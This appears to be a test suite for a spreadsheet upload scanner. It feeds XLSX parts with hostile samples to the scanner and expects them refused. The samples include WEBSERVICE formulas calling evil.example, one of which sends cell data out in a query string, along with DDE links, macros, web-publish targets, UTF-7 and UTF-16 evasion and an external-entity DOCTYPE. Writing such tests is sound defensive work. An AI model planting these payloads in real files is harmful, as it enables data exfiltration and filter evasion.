        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f>Sheet2!$A$1:$A$5</xm:f></x14:formula1></x14:dataValidation>',
      ),
    ],
    [
      'a conditional format formula',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>LEN(${EVIL_CALL})&gt;0</formula></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'a conditional format DDE link',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>${DDE_LINK}</formula></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'a table calculated column formula',
      'xl/tables/table1.xml',
      `${UTF8_DECLARATION}<table xmlns="${SPREADSHEET_NS}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><calculatedColumnFormula>${EVIL_CALL}</calculatedColumnFormula></tableColumn></tableColumns></table>`,
    ],
    [
      'a table totals row formula',
      'xl/tables/table1.xml',
      `${UTF8_DECLARATION}<table xmlns="${SPREADSHEET_NS}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><totalsRowFormula>${EVIL_CALL}</totalsRowFormula></tableColumn></tableColumns></table>`,
    ],
    [
      'a chart series DDE link',
      'xl/charts/chart1.xml',
      `${UTF8_DECLARATION}<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"><c:chart><c:plotArea><c:barChart><c:ser><c:val><c:numRef><c:f>${DDE_LINK}</c:f></c:numRef></c:val></c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>`,
    ],
    [
      'a pivot cache calculated field',
      'xl/pivotCache/pivotCacheDefinition1.xml',
      `${UTF8_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="1"><cacheFields count="1"><cacheField name="x" formula="${EVIL_CALL}" databaseField="0"/></cacheFields></pivotCacheDefinition>`,
    ],
    [
      'a shape text link calling WEBSERVICE',
      DRAWING_PART,
      drawingWith(`<xdr:sp macro="" textlink="${EVIL_CALL}"/>`),
    ],
    ['a shape macro', DRAWING_PART, drawingWith(`<xdr:sp macro="${DDE_LINK}" textlink=""/>`)],
    ['a picture macro in another case', DRAWING_PART, drawingWith('<xdr:pic Macro="[0]!m"/>')],
    [
      'a form control macro',
      'xl/ctrlProps/ctrlProp1.xml',
      `${UTF8_DECLARATION}<formControlPr xmlns="urn:x14" objectType="Button" fmlaMacro="[0]!Button1_Click"/>`,
    ],
    [
      'a form control cell link',
      'xl/ctrlProps/ctrlProp1.xml',
      `${UTF8_DECLARATION}<formControlPr xmlns="urn:x14" objectType="CheckBox" fmlaLink="${DDE_LINK}"/>`,
    ],
    ['a VML button macro', VML_PART, vmlWith(`<x:FmlaMacro>${EVIL_CALL}</x:FmlaMacro>`)],
    [
      'a VML button macro holding a comment',
      VML_PART,
      vmlWith('<x:FmlaMacro><!--m--></x:FmlaMacro>'),
    ],
    ['a VML cell link', VML_PART, vmlWith(`<x:FmlaLink>${DDE_LINK}</x:FmlaLink>`)],
    ['a VML list range', VML_PART, vmlWith('<x:FmlaRange>[1]Sheet1!A1</x:FmlaRange>')],
    ['a link attribute', SHEET_PART, worksheetWithAfter(`<z link="${DDE_LINK}"/>`)],
    [
      'a formula field in a shared strings part',
      SHARED_STRINGS_PART,
      `${UTF8_DECLARATION}<sst xmlns="${SPREADSHEET_NS}"><si><t>x</t></si><f>WEBSERVICE("x")</f></sst>`,
    ],
    [
      'a formula in a second root element',
      'xl/worksheets/sheet7.xml',
      `${UTF8_DECLARATION}<x/>${worksheetWithFormula('<f>WEBSERVICE("x")</f>').slice(UTF8_DECLARATION.length)}`,
    ],
  ])('refuses %s', (_label, entry, xml) => {
    expectUnsafeFormula(scanError(entriesOf({ [entry]: xml })), entry);
  });

  it.each<[label: string, entry: string, xml: string]>([
    [
      'an oleObjects element',
      SHEET_PART,
      worksheetWithAfter('<oleObjects><oleObject progId="Package" shapeId="1025"/></oleObjects>'),
    ],
    [
      'an oleObject element holding a DDE link',
      SHEET_PART,
      worksheetWithAfter(`<oleObject progId="Package" link="${DDE_LINK}" shapeId="1025"/>`),
    ],
    [
      'a controls element',
      SHEET_PART,
      worksheetWithAfter('<controls><control shapeId="1025" r:id="rId1"/></controls>'),
    ],
    ['a control element', SHEET_PART, worksheetWithAfter('<control shapeId="1025" r:id="rId1"/>')],
    [
      'a web publishing item',
      SHEET_PART,
      worksheetWithAfter(
        '<webPublishItems count="1"><webPublishItem id="1" divId="d" sourceType="sheet" destinationFile="\\\\evil.example\\s\\x.htm" autoRepublish="1"/></webPublishItems>',
      ),
    ],
    [
      'a web publishing object',
      WORKBOOK_PART,
      workbookWith(
        '<webPublishObjects count="1"><webPublishObject id="1" divId="d" destinationFile="http://evil.example/drop.htm" autoRepublish="1"/></webPublishObjects>',
      ),
    ],
  ])('refuses %s as unsafe-part', (_label, entry, xml) => {
    expectUnsafePart(scanError(entriesOf({ [entry]: xml })), entry);
  });

  it.each<[label: string, entry: string, xml: string]>([
    [
      'a defined name holding a sheet range',
      WORKBOOK_PART,
      workbookWith(
        `<definedNames><definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">'${URUNLER}'!$A$1:$AE$56</definedName></definedNames>`,
      ),
    ],
    [
      'the 3ve4 data validation list',
      SHEET_PART,
      worksheetWithAfter(
        '<dataValidations count="1"><dataValidation type="list" sqref="T2:T34" allowBlank="true"><formula1>OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))</formula1></dataValidation></dataValidations>',
      ),
    ],
    [
      "Excel's empty macro and text link on a shape",
      DRAWING_PART,
      drawingWith('<xdr:sp macro="" textlink=""/>'),
    ],
    [
      'a shape text link to a cell',
      DRAWING_PART,
      drawingWith('<xdr:sp macro="" textlink="$A$1"/>'),
    ],
    [
      'a picture link to a relationship',
      DRAWING_PART,
      drawingWith('<xdr:pic><a:blip xmlns:a="urn:a" r:link="rId1"/></xdr:pic>'),
    ],
    ['an empty VML button macro', VML_PART, vmlWith('<x:FmlaMacro/><x:FmlaMacro></x:FmlaMacro>')],
    ['a VML cell link to a cell', VML_PART, vmlWith('<x:FmlaLink>$A$1</x:FmlaLink>')],
    [
      'a namespace declaration whose prefix is a field name',
      SHEET_PART,
      worksheetWithAfter('<z xmlns:link="urn:a|b" xmlns:formula="urn:[x]"/>'),
    ],
    [
      'the text of a shared string',
      SHARED_STRINGS_PART,
      `${UTF8_DECLARATION}<sst xmlns="${SPREADSHEET_NS}"><si><t>WEBSERVICE("x")</t></si></sst>`,
    ],
    [
      'VML formulas of a shape type',
      VML_PART,
      `<xml ${VML_NAMESPACES}><v:shapetype id="_x0000_t202"><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/></v:formulas></v:shapetype></xml>`,
    ],
  ])('accepts %s', (_label, entry, xml) => {
    expect(scanError(entriesOf({ [entry]: xml }))).toBeNull();
  });
});

/** `xml` (which starts with the UTF-8 declaration) with `declaration` in its place. */
function withDeclaration(xml: string, declaration: string): string {
  return declaration + xml.slice(UTF8_DECLARATION.length);
}

/** `text` encoded UTF-16LE, preceded by the byte order mark FF FE when `bom`. */
function utf16le(text: string, bom: boolean): Uint8Array<ArrayBuffer> {
  const start = bom ? 2 : 0;
  const bytes = new Uint8Array(start + text.length * 2);
  if (bom) bytes.set([0xff, 0xfe]);
  for (let index = 0; index < text.length; index += 1) {
    const code = text.charCodeAt(index);
    bytes[start + index * 2] = code % 0x100;
    bytes[start + index * 2 + 1] = Math.floor(code / 0x100);
  }
  return bytes;
}

/** UTF-8 bytes of `before`, the single byte `byte`, then UTF-8 bytes of `after`. */
function withRawByte(before: string, byte: number, after: string): Uint8Array<ArrayBuffer> {
  const head = strToU8(before);
  const tail = strToU8(after);
  const bytes = new Uint8Array(head.length + 1 + tail.length);
  bytes.set(head);
  bytes[head.length] = byte;
  bytes.set(tail, head.length + 1);
  return bytes;
}

// A UTF-7 encoder writes 'W' as `+AFc-` and '"' as `+ACI-`.
const UTF7_WEBSERVICE_FORMULA = '<f>+AFc-EBSERVICE(+ACI-http://evil.example+ACI-)</f>';
const EVIL_FORMULA = '<f>WEBSERVICE("http://evil.example")</f>';
const INVALID_UTF8_LEAD_BYTE = 0xc0;

function expectPartEncoding(error: SpreadsheetFileError | null, entry = SHEET_PART): void {
  expect(error?.code).toBe('CORRUPT_FILE');
  expect(error?.meta).toEqual({ reason: ZIP_REJECT_REASONS.PART_ENCODING, entry });
}

describe('assertSafeXmlContent: every kept XML part is UTF-8 text', () => {
  it.each([
    ['a UTF-7 declaration', '<?xml version="1.0" encoding="UTF-7"?>'],
    ['a UTF-16 declaration', '<?xml version="1.0" encoding="UTF-16"?>'],
    ['an ISO-8859-1 declaration', '<?xml version="1.0" encoding="ISO-8859-1"?>'],
    ['a declaration target in another case', '<?XML version="1.0" encoding="UTF-7"?>'],
    ['a declaration the lexer cannot read', '<?xml version="1.0" encoding=UTF-7?>'],
  ])('refuses %s as CORRUPT_FILE part-encoding', (_label, declaration) => {
    const xml = withDeclaration(worksheetWithFormula(UTF7_WEBSERVICE_FORMULA), declaration);

    expectPartEncoding(scanError(entriesOf({ [SHEET_PART]: xml })));
  });

  it('refuses an invalid UTF-8 byte inside a name as CORRUPT_FILE part-encoding', () => {
    const xml = worksheetWithFormula('<f>WEB|SERVICE("http://evil.example")</f>');
    const [before = '', after = ''] = xml.split('|');

    expectPartEncoding(
      scanError({ [SHEET_PART]: withRawByte(before, INVALID_UTF8_LEAD_BYTE, after) }),
    );
  });

  it.each([
    ['with a byte order mark', true],
    ['without a byte order mark', false],
  ])('refuses a UTF-16LE part %s as CORRUPT_FILE part-encoding', (_label, bom) => {
    const xml = withDeclaration(
      worksheetWithFormula(EVIL_FORMULA),
      '<?xml version="1.0" encoding="UTF-16"?>',
    );

    expectPartEncoding(scanError({ [SHEET_PART]: utf16le(xml, bom) }));
  });

  it('checks a part that is not a worksheet too', () => {
    const xml = withDeclaration(
      `${UTF8_DECLARATION}<sst xmlns="${SPREADSHEET_NS}"/>`,
      '<?xml version="1.0" encoding="UTF-7"?>',
    );

    expectPartEncoding(scanError(entriesOf({ [SHARED_STRINGS_PART]: xml })), SHARED_STRINGS_PART);
  });

  it.each([
    ['a lower-case utf-8 declaration', '<?xml version="1.0" encoding="utf-8"?>'],
    ['a declaration without an encoding', '<?xml version="1.0" standalone="yes"?>'],
    ['no declaration', ''],
  ])('accepts %s', (_label, declaration) => {
    const xml = withDeclaration(worksheetWithFormula('<f>SUM(A1:A2)</f>'), declaration);

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });

  it('accepts a byte order mark before the declaration', () => {
    const xml = `${BYTE_ORDER_MARK}${worksheetWithFormula('<f>SUM(A1:A2)</f>')}`;

    expect(scanError(entriesOf({ [SHEET_PART]: xml }))).toBeNull();
  });
});

const CLEAN_SHEET = worksheetWithCell('<v>1</v>');
const EVIL_SHEET = worksheetWithFormula(EVIL_FORMULA);
const RELATIONSHIPS_NS = 'http://schemas.openxmlformats.org/package/2006/relationships';
const WORKSHEET_REL_TYPE =
  'http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet';
const FIRST_SHEET: XlsxFixtureSheet = { name: 'Sheet1', xml: CLEAN_SHEET };

/** Workbook rels naming sheet1 with the worksheet type and sheet2 with `secondType`. */
function relsWithSecondSheetType(secondType: string): string {
  return (
    `${UTF8_DECLARATION}<Relationships xmlns="${RELATIONSHIPS_NS}">` +
    `<Relationship Id="rId1" Type="${WORKSHEET_REL_TYPE}" Target="worksheets/sheet1.xml"/>` +
    `<Relationship Id="rId2" Type="${secondType}" Target="worksheets/sheet2.xml"/>` +
    '</Relationships>'
  );
}

/** Two sheets, the second holding `secondXml` and named by a relationship of `secondType`. */
function bookWithSecondSheetType(secondType: string, secondXml: string): Buffer {
  return buildXlsxFixture([FIRST_SHEET, { name: 'S2', xml: secondXml }], {
    [WORKBOOK_RELS_PART]: relsWithSecondSheetType(secondType),
  });
}

// The reader opens only the worksheets a relationship of exactly the transitional type
// names, at the entry its Target maps to; the export hands every part on unchanged, so
// the gate scans every kept XML part whatever the relationships say.
describe('upload gate: every kept worksheet part is scanned', () => {
  it.each([
    [
      'the Strict worksheet type',
      'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet',
    ],
    [
      'the worksheet type in another case',
      `${WORKSHEET_REL_TYPE.slice(0, -'worksheet'.length)}Worksheet`,
    ],
    ['the worksheet type with a trailing space', `${WORKSHEET_REL_TYPE} `],
  ])('refuses a formula in a second sheet named by %s', (_label, type) => {
    expectUnsafeFormula(gateError(bookWithSecondSheetType(type, EVIL_SHEET)), SECOND_SHEET_PART);
  });

  it.each([
    ['./worksheets/sheet2.xml', 'xl/./worksheets/sheet2.xml'],
    ['worksheets/sheet%32.xml', 'xl/worksheets/sheet%32.xml'],
  ])(
    'refuses a formula in the entry a Target alias %s names, the reader reading a clean one',
    (relTarget, partPath) => {
      const file = buildXlsxFixture(
        [FIRST_SHEET, { name: 'S2', xml: CLEAN_SHEET, partPath, relTarget }],
        { [SECOND_SHEET_PART]: EVIL_SHEET },
      );

      expectUnsafeFormula(gateError(file), SECOND_SHEET_PART);
    },
  );

  it('refuses a formula in a part whose root is a worksheet of any namespace, at any path', () => {
    const xml =
      `${UTF8_DECLARATION}<w:worksheet xmlns:w="urn:other"><w:sheetData><w:row r="1">` +
      `<w:c r="A1">${EVIL_FORMULA.replaceAll('f>', 'w:f>')}</w:c></w:row></w:sheetData>` +
      '</w:worksheet>';
    const file = buildXlsxFixture([FIRST_SHEET], { 'xl/x/a.xml': xml });

    expectUnsafeFormula(gateError(file), 'xl/x/a.xml');
  });

  it('refuses it on the read and the patch path alike', () => {
    const file = bookWithSecondSheetType(
      'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet',
      EVIL_SHEET,
    );
    const sheet = { by: 'name', name: 'Sheet1' } as const;
    const read = (): unknown => readUploadGrid(file, resolveReadOptions({ sheet }));
    const patch = (): Buffer =>
      patchFixture(file, [{ excelRow: 1, col: 0, value: { kind: 'number', value: '5' } }], {
        sheet,
      });

    expectUnsafeFormula(fileErrorOf(read), SECOND_SHEET_PART);
    expectUnsafeFormula(fileErrorOf(patch), SECOND_SHEET_PART);
  });

  it('accepts a clean worksheet no relationship names, and one named by the Strict type', () => {
    const safeSheet = worksheetWithFormula('<f>SUM(A1:A2)</f>');
    const unnamed = buildXlsxFixture([FIRST_SHEET], { 'xl/worksheets/sheet9.xml': safeSheet });
    const strict = bookWithSecondSheetType(
      'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet',
      safeSheet,
    );

    expect(gateError(unnamed)).toBeNull();
    expect(gateError(strict)).toBeNull();
  });

  it('refuses a formula past a quoted sheet name holding a quote, on any sheet', () => {
    const formula =
      "<f>'a&quot;b'!A1&amp;WEBSERVICE(&quot;http://evil.example/?d=&quot;&amp;A2)</f>";
    const onSecond = buildXlsxFixture([
      FIRST_SHEET,
      { name: 'a"b', xml: worksheetWithFormula(formula) },
    ]);
    const onFirst = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetWithFormula(formula) },
      { name: 'a"b', xml: CLEAN_SHEET },
    ]);

    expectUnsafeFormula(gateError(onSecond), SECOND_SHEET_PART);
    expectUnsafeFormula(gateError(onFirst));
  });

  it('refuses a second sheet declaring UTF-7 as CORRUPT_FILE part-encoding', () => {
    const utf7Sheet = withDeclaration(
      worksheetWithFormula(UTF7_WEBSERVICE_FORMULA),
      '<?xml version="1.0" encoding="UTF-7"?>',
    );
    const file = buildXlsxFixture([FIRST_SHEET, { name: 'S2', xml: utf7Sheet }]);

    expectPartEncoding(gateError(file), SECOND_SHEET_PART);
  });

  it('accepts all eight api fixtures', () => {
    for (const fixture of API_FIXTURES) {
      expect(gateError(readFixture(fixture)), fixture).toBeNull();
    }
  });
});

/** `text` as bytes: each code unit one byte (every code unit here is below 0x100). */
function latin1Bytes(text: string): Uint8Array<ArrayBuffer> {
  return Uint8Array.from(text, (character) => character.charCodeAt(0));
}

// What the first bytes of an entry say it holds; the gate keeps and scans XML whatever
// the entry's name.
describe('entryContentKind', () => {
  it.each<[label: string, bytes: Uint8Array, kind: EntryContentKind]>([
    ['an XML declaration', strToU8(UTF8_DECLARATION), 'xml'],
    ['a root element', strToU8('<a/>'), 'xml'],
    ['white space, then a root element', strToU8(' \r\n\t<a/>'), 'xml'],
    ['a UTF-8 byte order mark, then a root element', latin1Bytes('\xef\xbb\xbf<a/>'), 'xml'],
    ['a lone <', strToU8('<'), 'xml'],
    ['an image', latin1Bytes('\x89PNG\r\n'), 'other'],
    ['text', strToU8('png'), 'other'],
    ['nothing', new Uint8Array(0), 'other'],
    ['white space only', strToU8('   '), 'other'],
    ['a UTF-16 little-endian byte order mark', latin1Bytes('\xff\xfe<\x00a\x00'), 'misencoded'],
    ['a UTF-16 big-endian byte order mark', latin1Bytes('\xfe\xff\x00<\x00a'), 'misencoded'],
    ['a UTF-32 big-endian byte order mark', latin1Bytes('\x00\x00\xfe\xff'), 'misencoded'],
    ['UTF-16 little endian without a mark', latin1Bytes('<\x00?\x00'), 'misencoded'],
    ['UTF-16 big endian without a mark', latin1Bytes('\x00<\x00?'), 'misencoded'],
    ['UTF-32 big endian without a mark', latin1Bytes('\x00\x00\x00<'), 'misencoded'],
    ['white space and U+0000 before <', latin1Bytes(' \x00<\x00'), 'misencoded'],
  ])('reads %s', (_label, bytes, kind) => {
    expect(entryContentKind(bytes)).toBe(kind);
  });

  it('reads the same kind byte by byte as whole', () => {
    for (const text of ['<a/>', '\xef\xbb\xbf<a/>', '  png', '\xff\xfe<\x00', '\x00<', '<']) {
      const bytes = latin1Bytes(text);
      const sniff = createEntryContentSniff();
      for (const byte of bytes) feedEntryContentSniff(sniff, Uint8Array.of(byte));
      expect(finishEntryContentSniff(sniff), JSON.stringify(text)).toBe(entryContentKind(bytes));
    }
  });
});

describe('assertSafeXmlContent: entries chosen by content', () => {
  it.each([
    'xl/drawings/vmlDrawing1.vml',
    'xl/theme/theme1.xml',
    'xl/x/_rels/a.bin.rels',
    'xl/A.VML',
  ])('refuses %s holding no XML as CORRUPT_FILE part-encoding', (entry) => {
    expectPartEncoding(scanError(entriesOf({ [entry]: 'not xml' })), entry);
  });

  it('refuses a UTF-16 entry whatever its name as CORRUPT_FILE part-encoding', () => {
    const entry = 'xl/worksheets/sheet2.bin';
    const xml = withDeclaration(
      worksheetWithFormula(EVIL_FORMULA),
      '<?xml version="1.0" encoding="UTF-16"?>',
    );

    expectPartEncoding(scanError({ [entry]: utf16le(xml, true) }), entry);
  });

  it.each(['xl/worksheets/sheet2.bin', 'xl/worksheets/sheet2', 'xl/worksheets/sheet2.XML'])(
    'scans XML stored as %s',
    (entry) => {
      expectUnsafeFormula(scanError(entriesOf({ [entry]: EVIL_SHEET })), entry);
    },
  );

  it('scans a VML drawing: a DOCTYPE refuses', () => {
    const vml = '<!DOCTYPE x [<!ENTITY e SYSTEM "http://evil.example/x">]><xml>&e;</xml>';

    expect(scanError(entriesOf({ 'xl/drawings/vmlDrawing1.vml': vml }))?.code).toBe(
      'UNSAFE_CONTENT',
    );
  });

  it('leaves out an entry that holds no XML under a name that promises none', () => {
    const entries = {
      'xl/media/image1.png': latin1Bytes('\x89PNG\r\n'),
      'xl/printerSettings/printerSettings1.bin': strToU8('binary'),
    };

    expect(scanError(entries)).toBeNull();
  });
});

describe('isXmlPart', () => {
  // The reader opens only entries named .xml or .xml.rels.
  it.each([
    ['[Content_Types].xml', true],
    ['xl/worksheets/sheet1.xml', true],
    ['xl/_rels/workbook.xml.rels', true],
    ['_rels/.rels', false],
    ['xl/media/image1.png', false],
    ['xl/worksheets/sheet1.XML', false],
  ])('%s -> %s', (name, expected) => {
    expect(isXmlPart(name)).toBe(expected);
  });
});
